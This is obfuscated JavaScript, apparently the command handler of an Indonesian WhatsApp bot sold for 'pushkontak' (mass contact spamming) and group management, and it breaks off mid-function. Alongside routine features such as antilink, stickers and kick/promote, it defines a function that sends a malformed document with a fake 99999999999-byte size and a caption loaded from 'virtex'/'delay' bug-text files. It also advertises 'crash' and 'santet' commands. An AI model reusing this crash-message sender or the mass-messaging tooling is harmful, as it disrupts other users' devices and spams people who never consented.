module.exports = async (_0xb3bbc5, _0x2e8dd7, _0x2942eb) => {
  try {
    const _0x5c6477 = _0x2e8dd7.mtype === "conversation" && _0x2e8dd7.message.conversation ? _0x2e8dd7.message.conversation : _0x2e8dd7.mtype == "imageMessage" && _0x2e8dd7.message.imageMessage.caption ? _0x2e8dd7.message.imageMessage.caption : _0x2e8dd7.mtype == "documentMessage" && _0x2e8dd7.message.documentMessage.caption ? _0x2e8dd7.message.documentMessage.caption : _0x2e8dd7.mtype == "videoMessage" && _0x2e8dd7.message.videoMessage.caption ? _0x2e8dd7.message.videoMessage.caption : _0x2e8dd7.mtype == "extendedTextMessage" && _0x2e8dd7.message.extendedTextMessage.text ? _0x2e8dd7.message.extendedTextMessage.text : _0x2e8dd7.mtype == "buttonsResponseMessage" && _0x2e8dd7.message.buttonsResponseMessage.selectedButtonId ? _0x2e8dd7.message.buttonsResponseMessage.selectedButtonId : _0x2e8dd7.mtype == "templateButtonReplyMessage" && _0x2e8dd7.message.templateButtonReplyMessage.selectedId ? _0x2e8dd7.message.templateButtonReplyMessage.selectedId : "";
    const _0x442c6d = typeof _0x2e8dd7.text == "string" ? _0x2e8dd7.text : "";
    const _0x278fbc = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(_0x5c6477) ? _0x5c6477.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : ".";
    const _0x3f59e3 = require("chalk");
    const _0x5b5564 = _0x5c6477.startsWith(_0x278fbc);
    const _0x2ccd23 = _0x5c6477.replace(_0x278fbc, "").trim().split(/ +/).shift().toLowerCase();
    const _0x2495c9 = _0x278fbc + _0x2ccd23;
    const _0x4f7636 = _0x5c6477.trim().split(/ +/).slice(1);
    const _0x223b50 = _0x2e8dd7.quoted ? _0x2e8dd7.quoted : _0x2e8dd7;
    const _0x401616 = (_0x223b50.msg || _0x223b50).mimetype || "";
    const _0x5414c1 = _0x223b50.msg || _0x223b50;
    const _0x40c6c7 = q = _0x4f7636.join(" ");
    const _0x4a413c = _0x2e8dd7.sender == owner + "@s.whatsapp.net";
    const _0x8bc55c = _0x2e8dd7.chat.endsWith("@g.us");
    const _0x5d0db3 = await _0xb3bbc5.decodeJid(_0xb3bbc5.user.id);
    const _0x30750d = _0x2e8dd7.sender.split("@")[0];
    const _0x1d8f06 = _0x2e8dd7.pushName || "" + _0x30750d;
    const _0x1a313c = _0x5d0db3.includes(_0x30750d);
    const _0x5dab39 = _0x8bc55c ? await _0xb3bbc5.groupMetadata(_0x2e8dd7.key.remoteJid) : {};
    let _0x21575a = (_0x8bc55c ? _0x5dab39.participants.find(_0x583f5e => _0x583f5e.id == _0x2e8dd7.botNumber) : {}) || {};
    let _0x4b45b4 = (_0x8bc55c ? _0x5dab39.participants.find(_0x46d3f3 => _0x46d3f3.id == _0x2e8dd7.sender) : {}) || {};
    const _0x23de83 = _0x21575a?.admin !== null ? true : false;
    const _0x2f74b1 = _0x4b45b4?.admin !== null ? true : false;
    const {
      runtime: _0x326198,
      fetchJson: _0x46f8c3,
      getRandom: _0x3c4f5b,
      getTime: _0x5e96be,
      tanggal: _0x1480db,
      toRupiah: _0x57576f,
      telegraPh: _0xb3fac
    } = require("./all/function.js");
    const _0x5b5a3b = JSON.parse(fs.readFileSync("./all/database/payment.json"));
    const _0x39d313 = JSON.parse(fs.readFileSync("./all/database/contacts.json"));
    const {
      teksbug1: _0x1653b0
    } = require("./all/database/virtex.js");
    const {
      teksbug2: _0x1caf39
    } = require("./all/database/delay.js");
    async function _0x166cb1() {
      var _0x5a1eb7 = ["𝙻𝙾𝙰𝙳𝙸𝙽", "𝙻𝙾𝙰𝙳𝙸𝙽𝙶", "𝙻𝚘𝚊𝚍𝚒𝚗𝚐 𝚂𝚎𝚕𝚎𝚜𝚊𝚒..."];
      let {
        key: _0x1aeae4
      } = await _0xb3bbc5.sendMessage(from, {
        text: "𝙻𝙾𝙰𝙳"
      });
      for (let _0x1bb40d = 0; _0x1bb40d < _0x5a1eb7.length; _0x1bb40d++) {
        await _0xb3bbc5.sendMessage(from, {
          text: _0x5a1eb7[_0x1bb40d],
          edit: _0x1aeae4
        });
      }
    }
    const _0x55468a = ["red", "green", "yellow", "blue", "magenta", "cyan", "white"];
    const _0x419010 = _0x55468a[Math.floor(Math.random() * _0x55468a.length)];
    if (_0x5b5564) {
      console.log(_0x3f59e3.yellow.bgCyan.bold(namabot), color("[ PESAN ]", "" + _0x419010), color("FROM", "" + _0x419010), color("" + _0x30750d, "" + _0x419010), color("Text :", "" + _0x419010), color("" + _0x2495c9, "white"));
    }
    let _0x21c1a8 = db.data.chats[_0x2e8dd7.chat];
    if (typeof _0x21c1a8 !== "object") {
      db.data.chats[_0x2e8dd7.chat] = {};
    }
    if (_0x21c1a8) {
      if (!("antilink" in _0x21c1a8)) {
        _0x21c1a8.antilink = false;
      }
      if (!("antilink2" in _0x21c1a8)) {
        _0x21c1a8.antilink2 = false;
      }
      if (!("welcome" in _0x21c1a8)) {
        _0x21c1a8.welcome = true;
      }
    } else {
      db.data.chats[_0x2e8dd7.chat] = {
        antilink: false,
        antilink2: false,
        welcome: false
      };
    }
    if (_0x8bc55c && db.data.chats[_0x2e8dd7.chat].antilink && _0x23de83) {
      if (!_0x2f74b1 && !_0x4a413c && !_0x2e8dd7.fromMe) {
        var _0x9f16d6 = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi;
        if (_0x9f16d6.test(_0x2e8dd7.text)) {
          var _0x491a90 = "https://chat.whatsapp.com/" + (await _0xb3bbc5.groupInviteCode(_0x2e8dd7.chat));
          var _0xab7150 = new RegExp(_0x491a90, "i");
          var _0x55f742 = _0xab7150.test(_0x2e8dd7.text);
          if (_0x55f742) {
            return;
          }
          let _0x45e9fd = _0x2e8dd7.key.participant;
          let _0x3057fb = _0x2e8dd7.key.id;
          await _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
            text: "@" + _0x2e8dd7.sender.split("@")[0] + " Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!",
            contextInfo: {
              mentionedJid: [_0x2e8dd7.sender],
              externalAdReply: {
                thumbnailUrl: "https://i.top4top.io/p_3242kgq8f1.jpg",
                title: "｢ LINK GRUP DETECTED ｣",
                previewType: "PHOTO"
              }
            }
          }, {
            quoted: _0x2e8dd7
          });
          await _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
            delete: {
              remoteJid: _0x2e8dd7.chat,
              fromMe: false,
              id: _0x3057fb,
              participant: _0x45e9fd
            }
          });
          await _0xb3bbc5.groupParticipantsUpdate(_0x2e8dd7.chat, [_0x2e8dd7.sender], "remove");
        }
      }
    }
    if (_0x8bc55c && db.data.chats[_0x2e8dd7.chat].antilink2 && _0x23de83) {
      if (!_0x2f74b1 && !_0x4a413c && !_0x2e8dd7.fromMe) {
        var _0x9f16d6 = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi;
        if (_0x9f16d6.test(_0x2e8dd7.text)) {
          var _0x491a90 = "https://chat.whatsapp.com/" + (await _0xb3bbc5.groupInviteCode(_0x2e8dd7.chat));
          var _0xab7150 = new RegExp(_0x491a90, "i");
          var _0x55f742 = _0xab7150.test(_0x2e8dd7.text);
          if (_0x55f742) {
            return;
          }
          let _0x2df5df = _0x2e8dd7.key.participant;
          let _0x25b162 = _0x2e8dd7.key.id;
          await _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
            text: "@" + _0x2e8dd7.sender.split("@")[0] + " Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!",
            contextInfo: {
              mentionedJid: [_0x2e8dd7.sender],
              externalAdReply: {
                thumbnailUrl: "https://i.top4top.io/p_3242kgq8f1.jpg",
                title: "｢ LINK GRUP DETECTED ｣",
                previewType: "PHOTO"
              }
            }
          }, {
            quoted: _0x2e8dd7
          });
          await _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
            delete: {
              remoteJid: _0x2e8dd7.chat,
              fromMe: false,
              id: _0x25b162,
              participant: _0x2df5df
            }
          });
        }
      }
    }
    const _0x3c97fb = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(_0x2e8dd7.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        locationMessage: {
          name: "WhatsApp Bot dynz",
          jpegThumbnail: ""
        }
      }
    };
    const _0x1a6a98 = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(_0x2e8dd7.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        locationMessage: {
          name: "WhatsApp Bot Pushkontak By dynz",
          jpegThumbnail: ""
        }
      }
    };
    let _0x2f69fb = _0x1afedc => {
      return "\n*▬▬ι═══════ﺤ :*\n• ⪼ ketik *" + _0x2495c9 + "* " + _0x1afedc + "\n\n*LINK CHANNEL* \n_" + global.linksaluran + "_";
    };
    var _0x5f865a = async (_0x60fce8, _0x2afcfa, _0x33c54a) => {
      let _0x4a1ed0 = await Jimp.read(_0x60fce8);
      let _0x117ea9 = await _0x4a1ed0.resize(_0x2afcfa, _0x33c54a).getBufferAsync(Jimp.MIME_JPEG);
      return _0x117ea9;
    };
    function _0x515f60(_0x5ddf29) {
      return _0x5ddf29.charAt(0).toUpperCase() + _0x5ddf29.slice(1);
    }
    const _0x2f5dc5 = _0x252646 => {
      return crypto.randomBytes(_0x252646).toString("hex").slice(0, _0x252646);
    };
    const _0x2290c2 = {
      key: {
        remoteJid: "status@broadcast",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        listResponseMessage: {
          title: "Hello My Friends"
        }
      }
    };
    const _0x262882 = async _0x2e2f7f => {
      return _0xb3bbc5.sendMessage(_0x2e2f7f, {
        document: fs.readFileSync("./all/kosong.js"),
        mimetype: "😄😇😂🔥",
        fileName: "Paket.zip",
        fileLength: 99999999999,
        caption: "key.com" + _0x1caf39
      }, {
        quoted: _0x2290c2
      });
    };
    const _0x1857d0 = _0x36c2d9 => {
      danzz.sendMessage(from, {
        text: _0x36c2d9,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            title: "andree mek 🔥",
            containsAutoReply: true,
            mediaType: 1,
            thumbnail: thumb,
            mediaUrl: global.imageurl,
            sourceUrl: global.linksaluran
          }
        }
      }, {
        quoted: _0x2e8dd7
      });
    };
    switch (_0x2ccd23) {
      case "citra":
      case "dynz":
        {
          const _0x14dcf3 = "  \n┏⟬ *INFORMATION BOT* \n┃▹ *Owner :* 6285815657097\n┃▹ *Nama Owner   :DYNZ OFFICIAL* \n┃▹ *VERSI SC :* _1.0.0_\n┗╼──━━⪼\n\n╔╼ *𝙶𝚁𝚄𝙿 𝚃𝙴𝚁𝚃𝚄𝚃𝚄𝙿* •\n╠╾━⪼ pushkontak2 \n╠╾━⪼ savekontak2 \n╠╾━⪼ listgc\n╚╼──━━⪼\n\n╔╼ *𝙶𝚁𝙾𝚄𝙿 𝚃𝙴𝚁𝙱𝚄𝙺𝙰* •\n╠╾━⪼ pushkontak\n╠╾━⪼ savekontak\n╠╾━⪼ idgc\n╚╼──━━⪼\n\n╔╼ *𝚂𝙴𝚃𝚃𝙸𝙽𝙶 𝙼𝙴𝙽𝚄* •\n╠╾━⪼ cpanel\n╠╾━⪼ tts\n╠╾━⪼ qc\n╠╾━⪼ s\n╠╾━⪼ sendpayment\n╠╾━⪼ listserver\n╠╾━⪼ Done\n╠╾━⪼ owner\n╠╾━⪼ panel\n╚╼──━━⪼\n\n╔╼ *𝙹𝙿𝙼 𝙿𝙾𝚂𝚃* •\n╠╾━⪼ teksjpm\n╠╾━⪼ setjpm\n╠╾━⪼ jpm\n╠╾━⪼ jpmtesti\n╚╼──━━⪼\n\n╔╼ *𝙶𝚁𝙾𝚄𝙿 𝙼𝙴𝙽𝚄* •\n╠╾━⪼ setppgc\n╠╾━⪼ setnamegc\n╠╾━⪼ setdesk\n╠╾━⪼ open \n╠╾━⪼ close\n╠╾━⪼ demote\n╠╾━⪼ promote\n╠╾━⪼ add\n╠╾━⪼ kick\n╠╾━⪼ tagall\n┗╼──━━⪼\n\n╔╼ *𝚅𝙸𝙿 𝙼𝙴𝙽𝚄* •\n╠╾━⪼ crash\n╠╾━⪼ santet\n╚╼──━━⪼\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n *• • •「" + _0x5e96be().split("T")[1].split("+")[0] + "」• • •*\n *© powered by dynz official* \n▬▭▬▭▬▭▬▭▬▭▬▭▬";
          _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
            text: _0x14dcf3,
            contextInfo: {
              mentionedJid: [_0x2e8dd7.sender],
              externalAdReply: {
                thumbnailUrl: "https://i.top4top.io/p_3242kgq8f1.jpg",
                title: "𝐏𝐔𝐒𝐇𝐊𝐎𝐍𝐓𝐀𝐊 𝐁𝐘 𝐃𝐄𝐀𝐍",
                body: "HALLO @" + _0x2e8dd7.sender.split("@")[0],
                sourceUrl: "https://youtube.com/@hoedev",
                renderLargerThumbnail: true,
                mediaType: 1
              }
            }
          }, {
            quoted: _0x2e8dd7
          });
        }
        break;

      case "tts":
        {
          if (!_0x40c6c7) {
            return _0x2e8dd7.reply(_0x2f69fb("Hallo saya adalah Dynz hosting"));
          }
          if (_0x40c6c7.length >= 300) {
            return _0x2e8dd7.reply("Jumlah huruf harus di bawah 300!");
          }
          _0x2e8dd7.reply(msg.wait);
          let _0x4e051f = "id_001";
          try {
            const {
              data: _0x2d8f78
            } = await axios.post("https://tiktok-tts.weilnet.workers.dev/api/generation", {
              text: _0x40c6c7,
              voice: _0x4e051f
            });
            _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
              audio: Buffer.from(_0x2d8f78.data, "base64"),
              mimetype: "audio/mp4"
            }, {
              quoted: _0x2e8dd7
            });
          } catch (_0x2c913e) {
            return _0x2e8dd7.reply(_0x2c913e.toString());
          }
        }
        break;
      case "qc":
        {
          if (!_0x40c6c7) {
            return _0x2e8dd7.reply(_0x2f69fb("teksnya"));
          }
          let _0x4059a7 = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"];
          let _0x4c2caf;
          try {
            _0x4c2caf = await _0xb3bbc5.profilePictureUrl(_0x2e8dd7.sender, "image");
          } catch (_0x3c50c9) {
            _0x4c2caf = "https://telegra.ph/file/a059a6a734ed202c879d3.jpg";
          }
          let _0x4902da = await _0x4059a7[Math.floor(Math.random() * _0x4059a7.length)];
          _0x2e8dd7.reply(msg.wait);
          const _0x5982c2 = {
            type: "quote",
            format: "png",
            backgroundColor: _0x4902da,
            width: 512,
            height: 768,
            scale: 2,
            messages: [{
              entities: [],
              avatar: true,
              from: {
                id: 1,
                name: _0x2e8dd7.pushName,
                photo: {
                  url: _0x4c2caf
                }
              },
              text: _0x40c6c7,
              replyMessage: {}
            }]
          };
          try {
            const _0x2de3ad = await axios.post("https://bot.lyo.su/quote/generate", _0x5982c2, {
              headers: {
                "Content-Type": "application/json"
              }
            });
            const _0x55f380 = Buffer.from(_0x2de3ad.data.result.image, "base64");
            _0xb3bbc5.sendStimg(_0x2e8dd7.chat, _0x55f380, _0x2e8dd7, {
              packname: global.packname
            });
          } catch (_0x372ac8) {
            _0x2e8dd7.reply(_0x372ac8.toString());
          }
        }
        break;
      case "bubub":
      case "buypanel":
      case "buy":
      case "need":
      case "panel":
        {
          const _0x41907c = "" + global.list;
          _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
            text: _0x41907c,
            contextInfo: {
              mentionedJid: [_0x2e8dd7.sender],
              externalAdReply: {
                thumbnailUrl: "https://telegra.ph/file/8be97d7c69f8d2d6e3b46.jpg",
                title: "HALLO @" + _0x2e8dd7.sender.split("@")[0],
                body: "KLIK DI SINI UNTUK MEMBELI",
                sourceUrl: "https://wa.me/" + global.owner,
                renderLargerThumbnail: true,
                mediaType: 1
              }
            }
          }, {
            quoted: _0x2e8dd7
          });
        }
        break;
      case "sticker":
      case "stiker":
      case "sgif":
      case "s":
        {
          if (!/image|video/.test(_0x401616)) {
            return _0x2e8dd7.reply(_0x2f69fb("dengan mengirim foto/vidio"));
          }
          if (/video/.test(_0x401616)) {
            if (_0x5414c1.seconds > 15) {
              return _0x2e8dd7.reply("Durasi vidio maksimal 15 detik!");
            }
          }
          _0x2e8dd7.reply(msg.wait);
          var _0x9ca08c = await _0xb3bbc5.downloadAndSaveMediaMessage(_0x5414c1);
          await _0xb3bbc5.sendStimg(_0x2e8dd7.chat, _0x9ca08c, _0x2e8dd7, {
            packname: "PUSHKONTAK Dynz"
          });
          await fs.unlinkSync(_0x9ca08c);
        }
        break;
      case "onread":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          global.autoread = true;
          _0x2e8dd7.reply("*AUTO READ* _[ ON ]_*");
        }
        break;
      case "offread":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          global.autoread = false;
          _0x2e8dd7.reply("*AUTO READ* _[ Off ]_");
        }
        break;
      case "get":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          if (!_0x40c6c7) {
            return _0x2e8dd7.reply("linknya");
          }
          try {
            var _0x5d534f = await _0x46f8c3(_0x40c6c7);
            _0x2e8dd7.reply(JSON.stringify(_0x5d534f, null, 2));
          } catch (_0x2e24db) {
            return _0x2e8dd7.reply(_0x2e24db.toString());
          }
        }
        break;
      case "setteksjpm":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          if (_0x40c6c7 || _0x2e8dd7.quoted) {
            const _0xa12dd4 = _0x2e8dd7.quoted ? _0x2e8dd7.quoted.text : _0x40c6c7;
            await fs.writeFileSync("./all/database/teksjpm.js", _0xa12dd4.toString());
            _0x2e8dd7.reply("Berhasil Mengganti Teks JPM ✅");
          } else {
            return _0x2e8dd7.reply(_0x2f69fb("dengan reply/kirim teks\n\nUntuk melihat teks jpm saat ini ketik *.teksjpm*"));
          }
        }
        break;
      case "teksjpm":
        {
          if (!_0x4a413c) {
            return _0x2e8dd7.reply(msg.owner);
          }
          _0x2e8dd7.reply(fs.readFileSync("./all/database/teksjpm.js").toString());
        }
        break;
      case "owner":
        {
          _0xb3bbc5.sendContact(_0x2e8dd7.chat, [owner], "Telfon Atau Vc = Block", _0x2e8dd7);
        }
        break;
      case "setppgc":
        {
          if (!_0x8bc55c) {
            return _0x2e8dd7.reply(msg.group);
          }
          if (!_0x23de83) {
            return _0x2e8dd7.reply(msg.adminbot);
          }
          if (!_0x2f74b1 && !_0x4a413c) {
            return _0x2e8dd7.reply(msg.admin);
          }
          if (/image/g.test(_0x401616)) {
            let _0x2d371a = await _0xb3bbc5.downloadAndSaveMediaMessage(_0x5414c1);
            await _0xb3bbc5.updateProfilePicture(_0x2e8dd7.chat, {
              url: _0x2d371a
            });
            await fs.unlinkSync(_0x2d371a);
            _0x2e8dd7.reply("Berhasil Mengganti *Profil* Grup");
          } else {
            return _0x2e8dd7.reply(_0x2f69fb("dengan mengirim foto"));
          }
        }
        break;
      case "setnamegc":
      case "setnamagc":
        {
          if (!_0x8bc55c) {
            return _0x2e8dd7.reply(msg.group);
          }
          if (!_0x23de83) {
            return _0x2e8dd7.reply(msg.adminbot);
          }
          if (!_0x2f74b1 && !_0x4a413c) {
            return _0x2e8dd7.reply(msg.admin);
          }
          if (!_0x40c6c7) {
            return _0x2e8dd7.reply(_0x2f69fb("teksnya"));
          }
          const _0x370fe3 = metadata.subject;
          await _0xb3bbc5.groupUpdateSubject(_0x2e8dd7.chat, _0x40c6c7);
          _0x2e8dd7.reply("Berhasil Mengganti Nama Grup *" + _0x370fe3 + "* Menjadi *" + _0x40c6c7 + "*");
        }
        break;
      case "setdesc":
      case "setdesk":
        {
          if (!_0x8bc55c) {
            return _0x2e8dd7.reply(msg.group);
          }
          if (!_0x23de83) {
            return _0x2e8dd7.reply(msg.adminbot);
          }
          if (!_0x2f74b1 && !_0x4a413c) {
            return _0x2e8dd7.reply(msg.admin);
          }
          if (!_0x40c6c7) {
            return _0x2e8dd7.reply(_0x2f69fb("teksnya"));
          }
          await _0xb3bbc5.groupUpdateDescription(_0x2e8dd7.chat, _0x40c6c7);
          _0x2e8dd7.reply("Berhasil Mengganti *Deskripsi* Grup");
        }
        break;
      case "open":
        {
          if (!_0x8bc55c) {
            return _0x2e8dd7.reply(msg.group);
          }
          if (!_0x23de83) {
            return _0x2e8dd7.reply(msg.adminbot);
          }
          if (!_0x2f74b1 && !_0x4a413c) {
            return _0x2e8dd7.reply(msg.admin);
          }
          await _0xb3bbc5.groupSettingUpdate(_0x2e8dd7.chat, "not_announcement");
          _0x2e8dd7.reply("Setelan Grup Menjadi Anggota Dapat Mengirim Pesan");
        }
        break;
      case "close":
        {
          if (!_0x8bc55c) {
            return _0x2e8dd7.reply(msg.group);
          }
          if (!_0x23de83) {
            return _0x2e8dd7.reply(msg.adminbot);
          }
          if (!_0x2f74b1 && !_0x4a413c) {
            return _0x2e8dd7.reply(msg.admin);
          }
          await _0xb3bbc5.groupSettingUpdate(_0x2e8dd7.chat, "announcement");
          _0x2e8dd7.reply("Berhasil Mengganti Setelan Grup Menjadi Hanya Admin Yang Dapat Mengirim Pesan");
        }
        break;
      case "demote":
        {
          if (!_0x8bc55c) {
            return _0x2e8dd7.reply(msg.group);
          }
          if (!_0x2f74b1 && !_0x4a413c) {
            return _0x2e8dd7.reply(msg.admin);
          }
          if (!_0x23de83) {
            return _0x2e8dd7.reply(msg.adminbot);
          }
          if (_0x2e8dd7.quoted || _0x40c6c7) {
            let _0x48e6c4 = _0x2e8dd7.mentionedJid[0] ? _0x2e8dd7.mentionedJid[0] : _0x2e8dd7.quoted ? _0x2e8dd7.quoted.sender : _0x40c6c7.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
            await _0xb3bbc5.groupParticipantsUpdate(_0x2e8dd7.chat, [_0x48e6c4], "demote").then(_0x24f993 => _0x2e8dd7.reply("Berhasil Memberhentikan " + _0x48e6c4.split("@")[0] + " Sebagai Admin Grup Ini")).catch(_0x297fd8 => _0x2e8dd7.reply(_0x297fd8.toString()));
          } else {
            return _0x2e8dd7.reply(_0x2f69fb("62838XXX"));
          }
        }
        break;
      case "promote":
      case "promot":
        {
          if (!_0x8bc55c) {
            return _0x2e8dd7.reply(msg.group);
          }
          if (!_0x2f74b1 && !_0x4a413c) {
            return _0x2e8dd7.reply(msg.admin);
          }
          if (!_0x23de83) {
            return _0x2e8dd7.reply(msg.adminbot);
          }
          if (_0x2e8dd7.quoted || _0x40c6c7) {
            let _0x345e1a = _0x2e8dd7.mentionedJid[0] ? _0x2e8dd7.mentionedJid[0] : _0x2e8dd7.quoted ? _0x2e8dd7.quoted.sender : _0x40c6c7.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
            await _0xb3bbc5.groupParticipantsUpdate(_0x2e8dd7.chat, [_0x345e1a], "promote").then(_0x30826e => _0x2e8dd7.reply("Berhasil Menjadikan " + _0x345e1a.split("@")[0] + " Sebagai Admin Grup Ini")).catch(_0x56ba51 => _0x2e8dd7.reply(_0x56ba51.toString()));
          } else {
            return _0x2e8dd7.reply(_0x2f69fb("62838XXX"));
          }
        }
        break;
      case "add":
      case "addmember":
        {
          if (!_0x8bc55c) {
            return _0x2e8dd7.reply(msg.group);
          }
          if (!_0x4f7636[0]) {
            return _0x2e8dd7.reply(_0x2f69fb("62838XXX"));
          }
          var _0x1bd9c5 = _0x40c6c7.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          var _0x439112 = await _0xb3bbc5.onWhatsApp("" + _0x1bd9c5.split("@")[0]);
          if (_0x439112.length < 1) {
            return _0x2e8dd7.reply("Nomor Tersebut Tidak Terdaftar Di WhatsApp");
          }
          if (!_0x23de83 || !_0x5dab39.memberAddMode) {
            return _0x2e8dd7.reply("Gagal Menambahkan Member, Karna Admin Tidak Mengizinkam Peserta Dapat Add Member");
          }
          var _0x5b4410 = await _0xb3bbc5.groupParticipantsUpdate(_0x2e8dd7.chat, [_0x1bd9c5], "add");
          if (_0x5b4410[0].status == 200) {
            return _0x2e8dd7.reply("Berhasil Menambahkan " + _0x1bd9c5.split("@")[0] + " Kedalam Grup Ini");
          }
          if (_0x5b4410[0].status == 408) {
            return _0x2e8dd7.reply("Gagal Menambahkan " + _0x1bd9c5.split("@")[0] + " Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup");
          }
          if (_0x5b4410[0].status == 409) {
            return _0x2e8dd7.reply("Dia Sudah Ada Di Dalam Grup Ini!");
          }
          if (_0x5b4410[0].status == 403) {
            return _0x2e8dd7.reply("Gagal Menambahkan " + _0x1bd9c5.split("@")[0] + " Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup");
          }
        }
        break;
      case "kik":
      case "kick":
        {
          if (!_0x8bc55c) {
            return _0x2e8dd7.reply(msg.group);
          }
          if (!_0x23de83) {
            return _0x2e8dd7.reply(msg.adminbot);
          }
          if (!_0x2f74b1 && !_0x4a413c) {
            return _0x2e8dd7.reply(msg.admin);
          }
          if (_0x40c6c7 || _0x2e8dd7.quoted) {
            let _0xe82b40 = _0x2e8dd7.mentionedJid[0] ? _0x2e8dd7.mentionedJid[0] : _0x2e8dd7.quoted ? _0x2e8dd7.quoted.sender : _0x40c6c7.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
            await _0xb3bbc5.groupParticipantsUpdate(_0x2e8dd7.chat, [_0xe82b40], "remove").then(_0x21e578 => _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
              text: "Berhasil Mengeluarkan @" + _0xe82b40.split("@")[0] + " Dari Grup Ini",
              mentions: ["" + _0xe82b40]
            }, {
              quoted: _0x2e8dd7
            })).catch(_0x595d0e => _0x2e8dd7.reply(_0x595d0e.toString()));
          } else {
            return _0x2e8dd7.reply(_0x2f69fb("nomornya/@tag"));
          }
        }
        break;
      case "tagall":
      case "tag":
        {
          if (!_0x8bc55c) {
            return _0x2e8dd7.reply(msg.group);
          }
          if (!_0x2f74b1 && !_0x4a413c) {
            return _0x2e8dd7.reply(msg.admin);
          }
          if (!_0x40c6c7) {
            return _0x2e8dd7.reply(_0x2f69fb("Pesannya"));
          }
          var _0x5a1864 = await participant.map(_0x1860e6 => _0x1860e6.id);
          var _0x1bd9c5 = " " + _0x40c6c7 + "\n\n";
          _0x5a1864.forEach(_0x54f66a => _0x54f66a !== _0x2e8dd7.sender ? _0x1bd9c5 += "@" + _0x54f66a.split("@")[0] + "\n" : "");
          _0xb3bbc5.sendMessage(_0x2e8dd7.chat, {
            text: _0x1bd9c5,
            mentions: [..._0x5a1864]
          });
        }
        break;
      case "owner":
      case "creator":
        {
          _0xb3bbc5.sendContact(_0x2e8dd7.chat, ["" + owner[0].split("@")[0]], "Developer Bot", _0x2e8dd7);
        }
        break;
      case "on":
      case "enable":
        {
          if (_0x8bc55c) {
            if (!_0x2f74b1 && !_0x4a413c) {
              return _0x2e8dd7.reply(msg.admin);
            }
            if (!_0x40c6c7) {
              if (_0x2f74b1 && !_0x4a413c) {
                return _0x2e8dd7.reply(_0x2f69fb("welcome\n\n*List Options :*\nwelcome | antilink | antilinkV2\n\nKetik *" + _0x2495c9 + " status* untuk melihat status"));
              } else if (_0x4a413c) {
                return _0x2e8dd7.reply(_0x2f69fb("anticall\n\n*List Options :*\nwelcome | anticall | autoread | antilink | antilinkV2\n\nKetik *" + _0x2495c9 + " status* untuk melihat status"));
              }
            }
            var _0x1bd9c5;
            if (_0x40c6c7.toLowerCase() == "welcome") {
              db.data.chats[_0x2e8dd7.chat].welcome = true;
              _0x2e8dd7.reply("Berhasil Menyalakan *Welcome* Di Grup Ini");
            } else if (_0x40c6c7.toLowerCase() == "antilink") {
              db.data.chats[_0x2e8dd7.chat].antilink2 = false;
              db.data.chats[_0x2e8dd7.chat].antilink = true;
              _0x2e8dd7.reply("Berhasil Menyalakan *Antilink* Di Grup Ini");
            } else if (_0x40c6c7.toLowerCase() == "antilinkv2") {
              db.data.chats[_0x2e8dd7.chat].antilink = false;
              db.data.chats[_0x2e8dd7.chat].antilink2 = true;
              _0x2e8dd7.reply("Berhasil Menyalakan *AntilinkV2* Di Grup Ini");
            } else if (_0x40c6c7.toLowerCase() == "anticall") {
              if (!_0x4a413c) {
                return _0x2e8dd7.reply(msg.owner);
              }
              global.anticall = true;
              _0x2e8dd7.reply("Berhasil Menyalakan *Anticall*");
            } else if (_0x40c6c7.toLowerCase() == "autoread") {
              if (!_0x4a413c) {
                return _0x2e8dd7.reply(msg.owner);
              }
              global.autoread = true;
              _0x2e8dd7.reply("Berhasil Menyalakan *Autoread*");
            } else if (_0x40c6c7.toLowerCase() == "status") {
              if (_0x2f74b1 && !_0x4a413c) {
                _0x1bd9c5 = "\n◦ Welcome : " + (db.data.chats[_0x2e8dd7.chat].welcome ? "Aktif" : "Tidak Aktif") + "\n◦ Antilink : " + (db.data.chats[_0x2e8dd7.chat].antilink ? "Aktif" : "Tidak Aktif") + "\n◦ AntilinkV2 : " + (db.data.chats[_0x2e8dd7.chat].antilink2 ? "Aktif" : "Tidak Aktif") + "\n";
              } else if (_0x4a413c) {
